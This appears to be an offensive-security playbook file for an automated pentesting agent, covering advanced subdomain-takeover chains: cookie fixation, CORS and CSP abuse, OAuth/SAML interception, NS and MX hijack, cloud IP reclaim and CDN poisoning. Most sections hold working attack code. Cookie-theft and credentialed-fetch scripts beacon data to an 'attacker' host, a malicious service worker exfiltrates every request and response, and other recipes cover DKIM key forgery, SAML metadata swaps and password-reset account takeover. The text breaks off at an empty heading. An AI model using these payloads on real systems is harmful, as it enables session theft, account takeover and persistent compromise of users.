---
name: subdomain-takeover-advanced-deep
description: Advanced subdomain-takeover technique classes — the chain primitives (cookie, CORS, CSP, OAuth, SameSite), NS delegation and cloud-IP reuse, mail receipt to ATO, race-window and CT-log leading signals, and wildcard-dangling multipliers.
sibling: subdomain_takeover
load_when: scan_mode == "deep"
---

# Subdomain Takeover — Advanced Techniques

Base `subdomain_takeover.md` owns the enumeration pipeline, the ~50-provider V/E/N fingerprint table, the primary per-provider claim recipes, and the testing-methodology/validation/severity framing. This file owns the expert-tier chain primitives (what the claim actually buys in a modern web app), the non-CNAME surfaces (NS delegation, cloud IP reuse, MX/mail), the timing-sensitive classes (race windows, CT-log leading signals, decommission monitoring), and the force multipliers (wildcard dangling, second-order subresource loads). Current-frontier provider boundaries live in `subdomain_takeover_novel_deep.md`; this file assumes a successful claim and treats what it unlocks.

## Cookie Scope Pivot and Session Fixation

**Primitive.** Any origin under `*.example.com` can read, write, or overwrite cookies whose `Domain=.example.com` attribute makes them visible to every host on the registrable domain. A taken-over subdomain thereby grants read access to the parent's session cookies (if accessible to JS) and *write* access to all `Domain`-scoped cookies regardless of their HttpOnly flag, because `Set-Cookie` with a `Domain=` attribute is a server-side primitive the browser accepts from any same-registrable-domain origin.

**Preconditions.** All of: (i) the parent application sets at least one cookie with an explicit `Domain=.example.com` (not host-only), observable in `Set-Cookie` on any request; (ii) the taken-over subdomain is a sibling of the host that *consumes* the cookie, not a different registrable domain; (iii) the Public Suffix List does not list the parent zone as a public suffix (otherwise browsers refuse the `Domain=` write).

**Attack recipe.**

```http
# Session theft — Domain-scoped non-HttpOnly cookie, read via JS on the taken-over origin:
GET / HTTP/1.1
Host: sub.example.com
# payload served from the claim: <script>fetch('https://attacker/'+encodeURIComponent(document.cookie))</script>

# Cookie tossing / fixation — HttpOnly or not, write a shadowing cookie that
# the parent's path-matching logic will prefer. The attacker's cookie sorts
# ahead of the real one because browsers return cookies with more-specific
# paths and earlier creation first.
Set-Cookie: SESSION=attacker_fixed; Domain=.example.com; Path=/; Secure
```

The parent application subsequently reads `SESSION=attacker_fixed` on requests from the victim's browser and binds the victim's session to the attacker's value — classic session fixation, now reachable from a sibling the parent did not expect to be hostile.

**Confirmation signal.** On the controlled origin, open the browser dev tools and read `document.cookie` for a `Domain`-scoped cookie set by the parent, OR issue `Set-Cookie: canary=1; Domain=.example.com` and observe the parent-domain response echo `canary=1` on the next navigation. A host-only cookie (no `Domain=` attribute) will not appear and the primitive does not apply.

**Impact.** Session theft against the parent application when the cookie is readable; session fixation (full account impersonation of the next victim who authenticates) when it is HttpOnly; mass denial of service via cookie-size exhaustion when the fixation path is blocked. Routes to `authentication_jwt.md` if the cookie carries a JWT whose signature is weak enough to re-sign; routes to `csrf.md` for the SameSite-Lax bypass angle (next section).

## CORS Trust Escalation

**Primitive.** A reflected-origin or allowlist-based CORS policy on `api.example.com` that includes the taken-over subdomain (or `*.example.com`, or reflects the `Origin` header) with `Access-Control-Allow-Credentials: true` becomes a cross-origin credentialed-fetch channel from the attacker-controlled origin to the API.

**Preconditions.** All of: (i) the API responds to a cross-origin `Origin: https://sub.example.com` with `Access-Control-Allow-Origin: https://sub.example.com` AND `Access-Control-Allow-Credentials: true`; (ii) the victim is authenticated to the API in the same browser; (iii) the authentication state is cookie-based (bearer tokens in `Authorization` headers are not sent by the browser on cross-origin reads unless the client-side code attaches them).

**Attack recipe.**

```html
<!-- Served from the taken-over https://sub.example.com -->
<script>
fetch('https://api.example.com/account/me', {credentials: 'include'})
  .then(r => r.text())
  .then(body => navigator.sendBeacon('https://attacker/x', body));
</script>
```

For allowlist policies that match a prefix or regex (`^https?://[a-z0-9-]+\.example\.com$`), the controlled subdomain satisfies the regex and no further bypass is needed. For origin-reflection policies, any `Origin` header value is accepted; the attacker still prefers using the controlled trusted origin because it survives network-level same-origin filters and CSP `connect-src` allowlists keyed on `*.example.com`.

**Confirmation signal.** From the controlled origin, perform the `fetch(..., {credentials:'include'})` call. The HTTP response headers must show `Access-Control-Allow-Origin` set to the controlled origin (or `*` with credentials ignored, which fails the primitive) AND `Access-Control-Allow-Credentials: true`. The response body must contain data that requires authentication — a logged-in user profile, an authenticated-only list, a CSRF token to be exfiltrated. If the response is a generic unauthenticated page, the browser sent no cookies and the primitive is unproven.

**Impact.** Full read of authenticated API responses from the victim's session; theft of per-request CSRF tokens (now the `csrf.md` chain is unlocked); impersonation if a token is embedded in the body. Routes to `csrf.md` for a credentialed-write chain once the token is in hand.

## CSP `script-src` Gadget

**Primitive.** A Content Security Policy whose `script-src` allowlist includes `*.example.com` or the exact taken-over host grants script-execution rights in the parent's document context from any JavaScript the attacker serves on the controlled origin. The CSP meant to constrain XSS now trusts a hostile origin that renders the policy neutral for `script-src`.

**Preconditions.** All of: (i) the parent returns a CSP header or meta that includes the controlled host in `script-src` (or `default-src` when `script-src` is unset); (ii) there is a sink on the parent — a `<script src>` that attacker input can steer, a stored HTML field that can emit a `<script src>`, or a known-reflected parameter — to actually load from the controlled origin; (iii) the parent does not use SRI (`integrity=`) that would block an unexpected script body.

**Attack recipe.** When the CSP allows but a sink is not yet proven, chain with a reflected or stored content-injection primitive to emit the script tag; when the sink is in place, host arbitrary JS at the controlled URL.

```html
<!-- Attacker payload served at https://sub.example.com/x.js -->
<!-- The script runs in parent-origin JavaScript context on every page that loads it -->
<script>
(async () => {
  const r = await fetch('/api/me', {credentials: 'include'});
  navigator.sendBeacon('https://attacker/leak', await r.text());
})();
</script>
```

**Confirmation signal.** Observe the parent executing a script fetched from the controlled host — the Network tab shows a 200 for `https://sub.example.com/x.js`, there is no CSP violation report, and the script's side effects (an outbound beacon, a DOM mutation) are visible. A CSP violation blocked at `script-src` means the host is *not* in the allowlist and the primitive does not apply.

**Impact.** Equivalent to stored XSS in the parent application — full page-origin JavaScript execution, DOM access, cookie reads of non-HttpOnly cookies, keystroke capture via event handlers, exfiltration of any resource the authenticated page can read. Routes to `xss.md` for the post-execution exploitation surface.

## OAuth `redirect_uri` and SAML ACS Chain

**Primitive.** An IdP that accepts the taken-over host as a registered `redirect_uri` (OAuth 2.0 / OIDC) or Assertion Consumer Service URL (SAML) delivers the victim's authorization code or SAML assertion to the attacker-controlled origin on completion of a normal login flow, converting a defacement-grade takeover into account takeover of every user who completes the flow.

**Preconditions.** One of: (i) the OAuth client's `redirect_uri` allowlist includes the taken-over host directly, OR permits a prefix/subdomain match that the controlled host satisfies; (ii) the SAML SP's `AssertionConsumerServiceURL` metadata references the taken-over host; (iii) the client is configured with a lax matching policy (prefix match on registered URIs, path wildcards) that the controlled host can satisfy. Additionally: the authorization code or assertion must still be redeemable — PKCE (`S256`) binds the code to a verifier the attacker does not hold, so the primitive is weakened to code-interception-only unless the attacker also controls the client flow (public clients without PKCE are the direct hit).

**Attack recipe.**

```http
# Victim is tricked into initiating a legitimate login:
GET /authorize?response_type=code&client_id=app&redirect_uri=https://sub.example.com/callback&scope=openid+profile&state=... HTTP/1.1
Host: idp.example.com

# IdP returns a 302 to the taken-over sub.example.com with the code, which the
# attacker captures from its own HTTP logs. For a confidential client without
# PKCE the attacker then exchanges:
POST /token HTTP/1.1
grant_type=authorization_code&code=<captured>&redirect_uri=https://sub.example.com/callback&client_id=app&client_secret=...
```

For public clients using PKCE, the direct code-exchange path is closed; the chain degrades to a phishing primitive where the attacker's page on `sub.example.com` initiates its own authorization request, convinces the victim to approve, and completes the token exchange with the attacker's PKCE verifier — the user sees a legitimate `example.com`-origin consent screen.

**Confirmation signal.** Observe a real `code=` (or SAML `SAMLResponse` POST body) delivered to a URL on the controlled host during a victim-initiated login flow. For OAuth, confirm by presenting the captured code at `/token`; a `200 OK` with an `id_token` is irrefutable. For SAML, confirm by replaying the `SAMLResponse` to a legitimate SP endpoint and observing session establishment (do this only when authorized and never with real users' assertions).

**Impact.** Full account takeover of every user who completes the login against a client that allowlists the taken-over host, within the lifetime of the authorization code. For SAML, the assertion itself is the credential and may be replayable until its `NotOnOrAfter` passes. Routes to `authentication_jwt.md` for post-takeover token manipulation.

## SameSite Cookie Bypass via Same-Site Subdomain

**Primitive.** Browser `SameSite=Lax` and `SameSite=Strict` cookie attributes gate cross-*site* requests, where "site" is defined as the registrable domain plus scheme. A taken-over subdomain is same-site with the parent, so a page served from the controlled origin can issue requests to the parent that *carry* `SameSite=Lax`-protected cookies — the CSRF mitigation does not fire.

**Preconditions.** All of: (i) the parent uses `SameSite=Lax` or `Strict` as its CSRF defense (confirmed by inspecting `Set-Cookie` attributes); (ii) the parent does not additionally require a per-request CSRF token or a custom header that a sibling cannot forge; (iii) the sensitive action is reachable via a top-level navigation (`SameSite=Lax` allows top-level GETs with cookies — a form POST from a sibling does the rest when the action is state-changing-GET or the attacker chains with a top-level navigation).

**Attack recipe.**

```html
<!-- Served from https://sub.example.com -->
<form id="x" action="https://app.example.com/account/email" method="POST">
  <input name="new_email" value="attacker@evil.tld">
</form>
<script>document.getElementById('x').submit();</script>
```

A browser issuing this POST includes the parent's `SameSite=Lax` cookie because the submission originates from a same-site document. Where the parent's defense is a double-submit cookie or a custom `X-Requested-With`, the chain stalls unless additionally paired with the CORS primitive above (to read the token) or a CSP-script-src gadget (to inject the submission from within the parent itself).

**Confirmation signal.** Observe the parent's response to the cross-origin-from-attacker-view-but-same-site-from-browser-view POST reflecting an authenticated action — a 200 with the account-email changed, a 302 to a success page, a confirmation in the account's own view. The browser's Network tab shows the parent's session cookie attached to the request body (via dev-tools cookie-attribute inspection).

**Impact.** Full CSRF against a parent whose only mitigation was `SameSite`; chainable with CORS to defeat the token-second-defense; defeats the "SameSite is enough" posture that is still common on cookie-based sessions. Routes to `csrf.md` for the authenticated-write exploitation surface.

## Second-Order Subresource Load Primitive

**Primitive.** The parent application statically references `<script src>`, `<link rel=stylesheet href>`, `<img src>`, a web font (`@font-face` src), or an XHR/fetch URL whose host is now dangling. Taking over that host injects into every page that still imports it — equivalent to a persistent XSS or persistent CSS/font-based layout attack with no XSS primitive on the parent itself needed.

**Preconditions.** All of: (i) a parent-origin page references the dangling host in HTML, bundled JS, service workers, meta tags, or iframe `src`; (ii) the referenced host dangles (NXDOMAIN or provider-unclaimed) and the provider is in column V or E of the base's fingerprint table; (iii) the parent does not use SRI on the specific resource (SRI closes the primitive even if the host is taken over). CSP `script-src` and `connect-src` allowlists interact — a parent that allowlists the dangling host *and* references it is doubly exposed.

**Attack recipe.**

```bash
# Find dangling subresources imported by parent pages:
# 1. Crawl parent-origin HTML + bundled JS and extract every absolute hostname.
# 2. Resolve each; keep those that NXDOMAIN at the CNAME target or resolve into
#    a provider-unclaimed response.
# 3. Attempt the per-provider claim recipe from the base fingerprint table.
curl -s https://app.example.com | grep -oE 'https?://[^"'\'' ]+' | awk -F/ '{print $3}' | sort -u > hosts.txt
dnsx -l hosts.txt -cname -resp -silent | awk '{print $2}' | sed 's/[][]//g' | dnsx -silent -rcode nxdomain
# After claiming the dangling host, serve the live replacement at the referenced path:
# e.g. for a dangling <script src="https://cdn-old.example.com/app.js">
# host attacker.js at https://cdn-old.example.com/app.js
```

The injected script executes with the parent-origin privilege for scripts (because the browser treats a `<script src="https://x/y.js">` as running in the loading document's origin regardless of where the body came from). For CSS, the injection enables font/`attr()`-based data exfiltration and layout-based clickjacking; for images, side-channel-only in most browsers.

**Confirmation signal.** The parent page loads and executes code served from the controlled origin — the Network tab shows a 200 from the taken-over host on the referenced path, and the injected code's side effects run in the parent's document context (confirmed by `document.domain`, `location.origin`, and successful same-origin `fetch` on the parent's own APIs).

**Impact.** Persistent XSS in every page that imports the dangling resource, without any input-side bug in the parent; full exfiltration of authenticated API responses; service-worker install (if the dangling host is a service worker scope) establishes a persistent man-in-the-middle for every subsequent fetch on the parent origin until the worker is manually unregistered. Routes to `xss.md` for the exploitation surface.

## NS Delegation Takeover

**Primitive.** When a parent zone delegates a child subzone (`sub.example.com NS ns1.old-nameserver.tld`) and the authoritative nameserver's registrable domain is expired or claimable, registering that domain yields authoritative control of every hostname under the delegated label — not just one dangling name. The claim grants a wildcard-equivalent takeover across an arbitrary namespace.

**Preconditions.** All of: (i) the parent zone contains `NS` records that delegate a subzone to nameservers on a different registrable domain; (ii) the authoritative nameserver's registrable domain is either expired, unregistered, in `pendingDelete`/`redemptionPeriod`, or otherwise claimable at a registrar; (iii) the delegation is still live (parent still returns the stale NS set to resolvers). Lame delegation (NS returns `SERVFAIL`/`REFUSED`) is a strong tell but not required — the primitive hinges on registrable-domain claimability, not resolver behavior.

**Attack recipe.**

```bash
# Enumerate NS at child-zone granularity; check each NS domain's registration state:
dig +short NS sub.example.com
for ns in $(dig +short NS sub.example.com); do
  reg=$(echo "$ns" | rev | cut -d. -f1,2 | rev)
  state=$(whois "$reg" 2>/dev/null | grep -iE 'no match|not found|expir|redemption|pendingDelete')
  echo "$ns -> $reg : $state"
done

# After registering the expired registrable domain and standing up authoritative NS:
# publish A/CNAME/MX/TXT records for arbitrary labels under sub.example.com.
# e.g.
# sub.example.com.           A    <attacker-ip>
# login.sub.example.com.     A    <attacker-ip>
# acme-challenge.sub.example.com. TXT "..."
# then satisfy a DV CA's HTTP-01/DNS-01 challenge to issue valid certs for *.sub.example.com.
```

The DNS-01 challenge path is the force multiplier: with authoritative control of the delegated subzone, the attacker satisfies ACME DNS-01 for `*.sub.example.com` and obtains a wildcard DV certificate, cementing TLS trust alongside DNS trust.

**Confirmation signal.** Resolver returns answers from the newly-registered nameserver for arbitrary labels under the delegated zone — `dig @8.8.8.8 proof.sub.example.com` responds with the attacker-published A record and the authoritative-nameserver response shows the attacker's NS set. Independent confirmation: a CT-log entry for a DV cert issued to `*.sub.example.com` while the attacker controls the registrable.

**Impact.** Complete takeover of an arbitrary namespace under the delegated label, including the ability to serve any hostname with a valid DV certificate, receive mail (`MX`), satisfy OAuth/SSO allowlists for arbitrary hostnames, and run NS-level TTL manipulation to persist the hijack past the registrable's loss. The highest-impact variant of the class because the claim is zone-wide, not record-wide. Routes to `authentication_jwt.md` and `csrf.md` for post-takeover exploitation of trust the parent extends to the delegated zone.

## Cloud IP Reuse (Dangling A Records)

**Primitive.** An `A`/`AAAA` record pointing at a public cloud IP that the org has released is claimable by cycling allocations in the target region/pool until the provider hands back that exact IP. The CNAME-takeover intuition — "create the resource with the right name" — does not apply; the resource is the IP, drawn from a shared pool, and the claim is probabilistic.

**Preconditions.** All of: (i) the dangling record points at an IP inside the provider's published egress or elastic range (`https://ip-ranges.amazonaws.com/ip-ranges.json`, GCP `_cloud-netblocks` SPF, Azure's weekly `AzureIPRanges` JSON); (ii) the IP is actually released, not merely filtered — `curl -sv https://<ip>:443` must return a provider-default response (an AWS ALB `No Response from Server`, an Azure App Service default page, a GCP load-balancer 404) rather than a timeout or `connection-refused` from an org-owned-but-firewalled service; (iii) the attacker has sufficient allocation budget in the right region to run the cycle for the target probability.

**Attack recipe.**

```bash
# AWS EIP reclaim loop, scoped to one region, authorized:
TARGET=203.0.113.45
REGION=us-east-1
while :; do
  A=$(aws --region "$REGION" ec2 allocate-address --domain vpc --query PublicIp --output text) || break
  echo "allocated $A"
  if [ "$A" = "$TARGET" ]; then
    echo "claimed $A — stop"
    break
  fi
  aws --region "$REGION" ec2 release-address --public-ip "$A"
done

# After claiming the IP, bind an instance/listener and serve:
aws ec2 associate-address --public-ip "$TARGET" --instance-id <i-...>
```

Probability per allocation is low — AWS cycles IPs through a cooldown and does not hand them straight back — but each attempt is cheap and the loop runs until budget or success. For GCP ephemeral IPs the cycle rate is faster but the pool is wider. Azure Public IP standard-SKU uses a tenant-level reservation window; the base behavior is covered in `subdomain_takeover_novel_deep.md § Classic Cloud Service Reservation Window`.

**Confirmation signal.** The attacker-controlled instance receives real traffic addressed to the dangling hostname — the HTTP `Host` header on inbound requests matches `sub.example.com`, the TLS SNI shows the hostname, and a DV-cert issuance against the hostname succeeds (ACME HTTP-01 served from the claimed IP responds for `/.well-known/acme-challenge/<token>`).

**Impact.** Identical to CNAME takeover once bound — content injection on the trusted origin, DV-cert issuance, cookie/CORS/CSP/OAuth chains all unlock. Rate the finding on the trusted-origin-impact basis the base's Severity section defines; note the probabilistic claim explicitly in the report. False positive: the IP still belongs to the org but is firewalled — confirm with provider-side banner / default-page behavior before claiming.

## MX Takeover to Account Takeover

**Primitive.** An `MX` record pointing at a decommissioned mail provider or an expired-domain nameserver (claimable via the NS Delegation primitive above) lets the attacker receive mail for the subdomain or apex, converting mail-receipt-only into account takeover whenever the attacker can trigger a password-reset flow against a real user at the vulnerable mail domain.

**Preconditions.** All of: (i) the subdomain or apex has an `MX` record pointing at a mail host the attacker can claim (decommissioned provider name, expired registrable, same-provider orphan where the mail-host account was deleted); (ii) real external services allow users to authenticate with an email address under the vulnerable domain, OR the vulnerable domain is used for internal recovery/support addresses that are reachable from outside; (iii) the mail flow is not DMARC-rejected on inbound — reject-policy DMARC on *outbound* mail from the vulnerable domain does not block inbound receipt.

**Attack recipe.**

```bash
# Confirm the MX dangles:
dig +short MX sub.example.com
# MX host → check claimability (NXDOMAIN target, expired registrable, provider-unclaimed response)

# After claiming the MX host, stand up a catch-all SMTP receiver:
# postfix virtual-aliases @sub.example.com -> capture@attacker.tld
# or run a minimal Python asyncore server that accepts DATA and prints to disk

# Trigger a password reset at a target service for a known-good user:
# POST /password/reset  email=victim@sub.example.com
# The reset message delivers to the attacker's catch-all; follow the one-time link.
```

Receiving one password-reset link against a service the victim actually uses is account takeover against that service — the full ATO chain, not just a leaked email. The practical scope depends on which services are configured for the vulnerable mail domain; LinkedIn-era enumeration (public user→email mappings), breach-corpus crosswalks, and HR-portal enumerations are the typical sources.

**Confirmation signal.** The attacker's catch-all receives a real message addressed to a user at the vulnerable domain — `RCPT TO:` matches the target address, `From:` names a real service, and the body contains a reset link that redeems to a 200. Confirm scope by inventorying how many services route to the mail domain (grep breach corpora + public enumeration), not by firing resets against production users without authorization.

**Impact.** Full account takeover against any external service tied to the mail domain; recovery-identity hijack for internal SSO where the mail is the sole recovery factor; passive signals from catch-all collection reveal partner integrations and internal service names. The highest-severity mail outcome; distinguish explicitly from merely receiving a tester-created message. Routes to `authentication_jwt.md` for post-reset token exploitation.

## Race Window and Decommission Monitoring

**Primitive.** Many takeover windows are short — a resource is deleted, the DNS record is cleaned up minutes-to-days later. An attacker who monitors the target's record set and fires the claim within the window captures resources the org would otherwise reclaim through cleanup automation. CT-log monitoring is the complementary leading signal: a cert that was renewed-and-then-not-reissued often precedes a decommission.

**Preconditions.** One of: (i) a known-high-value subdomain whose backing resource is likely to be churned (project-named subdomain, event-dated subdomain, acquired-company-branded subdomain); (ii) a CT-log signal indicating cert churn (sudden non-renewal of a cert that was reliably renewed on schedule); (iii) a pattern-based hypothesis — all `*.staging.example.com` names revert to NXDOMAIN after a sprint; all `review-*.example.com` names decommission after merge.

**Attack recipe.**

```bash
# cheap deletion monitor:
while :; do
  dnsx -l tracked.txt -cname -resp -silent | \
    awk '{print $2}' | sed 's/[][]//g' | \
    dnsx -silent -rcode nxdomain -o freshly-dangling.txt
  if [ -s freshly-dangling.txt ]; then
    for name in $(cat freshly-dangling.txt); do echo "DANGLING NOW: $name"; done
    # fire the pre-configured per-provider claim recipe for each name
  fi
  sleep 300
done

# CT-log leading signal — a cert that stops renewing is a decommission hint:
# subscribe to certstream (certstream.calidog.io) and filter for the target zone,
# alert on first non-renewal past the expected cadence.
```

The window is bounded by the org's cleanup automation — typical cadence is daily for Terraform-managed zones, hourly for cloud-native lifecycle policies, and arbitrary for manual processes. The faster the monitor and the per-provider claim pipeline, the more wins; a pre-authorized subscription-level API token in the right region shaves seconds off the claim.

**Confirmation signal.** The monitor fires on a name that was reliably resolving the prior poll, and the per-provider claim recipe succeeds within the window — a `201 Created` from the provider API, a 200 on the taken-over host serving the attacker's payload, and (optionally) a CT-log entry for a DV cert issued to the taken-over name.

**Impact.** Converts a one-shot enumeration into a continuous program; captures high-value transient subdomains (event sites, launch microsites, acquired-company redirects) at the moment they fall; defeats cleanup automations that remove the DNS record only after the resource is torn down. Routes to `reconnaissance/*` for the pattern-discovery angle.

## Service-Worker Install Persistence

**Primitive.** A parent-origin page that registers a service worker whose script is served from a dangling same-origin or same-site host installs an attacker-controlled worker when the host is claimed. The worker intercepts every subsequent `fetch` on the parent origin via its `fetch` event handler, establishing a persistent man-in-the-middle that outlives the current browser session and keeps firing on every reload until the user explicitly unregisters it in dev tools.

**Preconditions.** All of: (i) the parent calls `navigator.serviceWorker.register('<url>')` with a `<url>` on a dangling host; (ii) the registration URL is same-origin OR the service worker's scope header (`Service-Worker-Allowed`) permits a broader scope than the serving origin; (iii) the parent page is served over HTTPS (service workers require secure contexts) and the attacker can obtain a DV cert for the dangling host; (iv) the parent does not use SRI for the registration (SRI closes it).

**Attack recipe.**

```js
// Served from the claimed https://assets.example.com/sw.js, with
// Service-Worker-Allowed: / so scope broadens to the whole origin:
self.addEventListener('install', e => self.skipWaiting());
self.addEventListener('activate', e => e.waitUntil(self.clients.claim()));
self.addEventListener('fetch', e => {
  const req = e.request;
  // Clone and exfiltrate every request/response pair before passing through:
  e.respondWith((async () => {
    const r = await fetch(req);
    const body = await r.clone().text();
    navigator.sendBeacon('https://attacker/x', JSON.stringify({u: req.url, b: body}));
    return r;
  })());
});
```

The worker persists in the browser's registration store keyed by `(origin, scope)`. Every subsequent visit to the parent origin re-activates it before the page's own scripts run; even a hard refresh (Shift+Reload) does not unregister. Only the user manually unregistering (chrome://inspect/#service-workers or DevTools → Application → Service Workers → Unregister) or the parent explicitly calling `registration.unregister()` from a fresh script terminates it.

**Confirmation signal.** On the parent origin after the claim, DevTools → Application → Service Workers shows the attacker's `sw.js` registered and active; the Network tab shows requests served *from ServiceWorker* with 304-equivalent status when the worker intercepts; the attacker's exfiltration endpoint receives traffic from every authenticated page the victim visits. The TLS certificate on the serving host is a valid DV cert for the dangling name — the browser does not install a service worker over a cert error.

**Impact.** Persistent credentialed-fetch MITM for every parent-origin resource until manual unregistration; survives logout, cache clearing (worker is stored separately from cache), and incognito reset depending on browser (Chrome unregisters on incognito close; Firefox persists in some configurations). The highest-persistence class of subdomain-takeover exploitation; routes to `xss.md § Persistence` for the long-tail exploitation surface and to `csrf.md` for authenticated-write forgery through the worker's `fetch` interception.

## DKIM, SPF, and .well-known Delegation Hijack

**Primitive.** DNS-based service discovery delegates trust to external hostnames in several places other than CNAME: DKIM selectors (`selector._domainkey.example.com CNAME dkim-provider.tld`), SPF `include:` directives (`v=spf1 include:spf.external.tld`), ACME DNS-01 challenge CNAMEs (`_acme-challenge.sub.example.com CNAME acme.ext.tld`), MTA-STS and TLSRPT reporting hosts (`_mta-sts.example.com`, `_smtp._tls.example.com`), and OpenID Connect / OAuth `.well-known` discovery endpoints hosted on sibling subdomains. Each of these dangles if the pointed-at host is claimable, and the trust each confers is a distinct primitive.

**Preconditions.** All of: (i) one of the above delegations exists at the parent zone; (ii) the pointed-at host is NXDOMAIN or provider-unclaimed; (iii) the claim recipe for the destination provider is in column V or E of the base's fingerprint table.

**Attack recipes (per delegation):**

```bash
# DKIM selector CNAME to a dangling provider → publish an attacker DKIM public key:
dig +short default._domainkey.example.com   # CNAME dkim-old.saas-provider.tld
# claim dkim-old.saas-provider.tld (per the base's fingerprint table)
# publish TXT: "v=DKIM1; k=rsa; p=<attacker-public-key-base64>"
# the attacker now signs mail "From: anyone@example.com" with a key the recipient's
# DKIM validator fetches from the claimed host — DMARC alignment passes.

# SPF include: of a dangling third-party → add the attacker's IPs to the SPF chain:
dig +short TXT example.com | grep spf1       # v=spf1 include:spf.ext.tld ~all
# claim ext.tld's SPF-hosting record (if dangling); publish SPF with the attacker's ranges
# the attacker's IPs now pass SPF for the parent domain.

# .well-known/openid-configuration on a dangling host → forge the IdP's discovery:
# A relying party does: GET https://auth.example.com/.well-known/openid-configuration
# If auth.example.com dangles, serve a configuration pointing jwks_uri and
# authorization_endpoint at attacker infrastructure; RP trusts the discovery doc
# and uses the attacker's JWKS for signature validation — algorithm confusion /
# key-ID substitution follow. Route to authentication_jwt.md for the JWKS trust primitive.

# ACME DNS-01 CNAME to a dangling host → attacker satisfies challenges and issues
# arbitrary DV certs under the parent's name:
dig +short _acme-challenge.sub.example.com   # CNAME acme-old.ext.tld
# claim acme-old.ext.tld, publish arbitrary TXT values on demand, satisfy ACME DNS-01
# for *.sub.example.com — a wildcard DV cert without controlling the DNS zone root.
```

**Confirmation signal (per primitive).** DKIM: an attacker-signed message with `From: anyone@example.com` passes a recipient-side DKIM check (`dkim=pass` in the receiver's `Authentication-Results`) and DMARC aligns. SPF: `host -t txt example.com | grep spf1` resolves through the include chain to the attacker-published include; an attacker-source `MAIL FROM:` passes SPF. OIDC: a relying party fetches the attacker's discovery doc and uses the attacker-published `jwks_uri` for a token-signature check (observable in the RP's log). ACME: a CA issues a cert chaining to the attacker's challenge satisfaction, visible in CT logs.

**Impact.** DKIM: mail-signature forgery for arbitrary senders under the parent domain, defeating DMARC-align and brand-protect posture. SPF: adds the attacker's egress ranges to the parent's SPF-allowlist, enabling spoof-with-pass. OIDC `.well-known`: relying parties trust an attacker-published JWKS and `authorization_endpoint` — full identity-trust hijack across every RP that discovers through the hijacked endpoint. ACME DNS-01: wildcard DV cert issuance against arbitrary labels under the parent zone, without controlling the primary nameservers. Routes to `authentication_jwt.md § JWKS Trust`, to `csrf.md` for mail-based phishing chains, and to the base's NS-delegation entry for the complementary primary-zone takeover.

## SAML SP Metadata Hijack

**Primitive.** A SAML Service Provider that publishes its metadata (`EntityDescriptor`, including the SP's signing certificate and `AssertionConsumerServiceURL`) on a dangling subdomain, and an IdP that fetches the metadata URL dynamically to resolve the SP's current configuration, lets the attacker rewrite the SP's trust anchor. The attacker claims the dangling host, serves metadata with an attacker-controlled signing cert and ACS URL, and the IdP accepts the new configuration on next refresh.

**Preconditions.** All of: (i) the IdP is configured to pull SP metadata from a URL (SAML metadata-on-the-fly, used by Shibboleth, SimpleSAMLphp, Keycloak, and others) rather than from a locally-stored static artifact; (ii) the metadata URL hostname is claimable; (iii) the IdP does not pin the metadata signature or require out-of-band metadata trust (uncommon in enterprise but widespread in federation deployments).

**Attack recipe.**

```bash
# Dangling metadata URL discovery:
# Look in federation metadata catalogs (eduGAIN, incommon) or per-SP registration
# for metadata URLs. Resolve each; keep those on dangling hosts.

# After claim, serve attacker metadata with ACS pointing at attacker.tld and
# the KeyDescriptor containing the attacker's signing cert:
cat > /var/www/metadata.xml <<EOF
<EntityDescriptor xmlns="urn:oasis:names:tc:SAML:2.0:metadata" entityID="https://sp.example.com">
  <SPSSODescriptor protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol">
    <KeyDescriptor use="signing"><ds:KeyInfo><ds:X509Data><ds:X509Certificate>
      <!-- attacker's base64 cert -->
    </ds:X509Certificate></ds:X509Data></ds:KeyInfo></KeyDescriptor>
    <AssertionConsumerService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST"
      Location="https://attacker.tld/acs" index="0"/>
  </SPSSODescriptor>
</EntityDescriptor>
EOF
```

**Confirmation signal.** The IdP's next metadata refresh fetches the attacker's XML (observable in the IdP's debug log, or via the HTTP request landing on the controlled host). A subsequent legitimate login flow routes the SAML `Response` POST to the attacker's `AssertionConsumerServiceURL`, and the IdP's reflected XML includes `destination="https://attacker.tld/acs"` matching the attacker's metadata.

**Impact.** Every user who authenticates through the IdP has their assertion delivered to the attacker; the assertion itself carries the user's attributes and (depending on the IdP) a validity window during which the attacker can replay it to the real SP. Full account-takeover primitive against federated SSO. Routes to `authentication_jwt.md` for post-takeover token-manipulation downstream.

## CDN Alt-Origin Cache Poisoning

**Primitive.** A CDN configured with multiple origins or a "fallback origin" that resolves to a dangling subdomain can be coerced into caching attacker-served content under the trusted CDN host. Where the CDN keys its cache on `(URL, Vary)` without origin disambiguation, a request routed to the taken-over origin writes an entry that subsequent legitimate requests hit — persistent cache poisoning without any input to the parent.

**Preconditions.** All of: (i) the CDN is configured with a secondary/fallback origin on a dangling host, OR a routing rule that selects origins based on attacker-controllable input (geo, device-type, path prefix); (ii) cache keys do not include the origin identity (common CDN default — the key is `(host, path, Vary-headers)`); (iii) the CDN does not enforce `must-revalidate` or origin-signature verification; (iv) the attacker can trigger a request that routes to the dangling origin (via the routing rule's selection logic).

**Attack recipe.** Claim the dangling fallback origin per the base's recipes; serve a payload with explicit `Cache-Control: public, max-age=86400`; trigger a request from a position (geo, device, path) that the CDN routes to the dangling origin; the entry is now cached under the trusted CDN host.

```http
# Attacker payload served at the taken-over fallback origin:
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Cache-Control: public, max-age=86400
Vary: User-Agent

<script>navigator.sendBeacon('https://attacker/leak', document.cookie)</script>
```

**Confirmation signal.** A request to the trusted CDN host from an *uninvolved* user returns the attacker's payload with `Age:` header > 0 and `X-Cache: HIT` (or the CDN's equivalent) — confirms the payload is served from the cache, not from the taken-over origin directly. Verify the cache key by varying every candidate dimension (`User-Agent`, `Accept-Encoding`, geo) and observing which permutations hit the poisoned entry.

**Impact.** Mass XSS/malware delivery to every user whose cache-key fingerprint matches the poisoned entry, scoped by `Vary` dimensions; survives the attacker giving up the origin because the entry persists until TTL expiration (or forever on edges with no revalidation). Routes to `xss.md` for the delivered payload's exploitation and to `http_request_smuggling.md § Cache Deception` for keyed-request variants.

## Mobile Deep-Link and Universal-Link Hijack

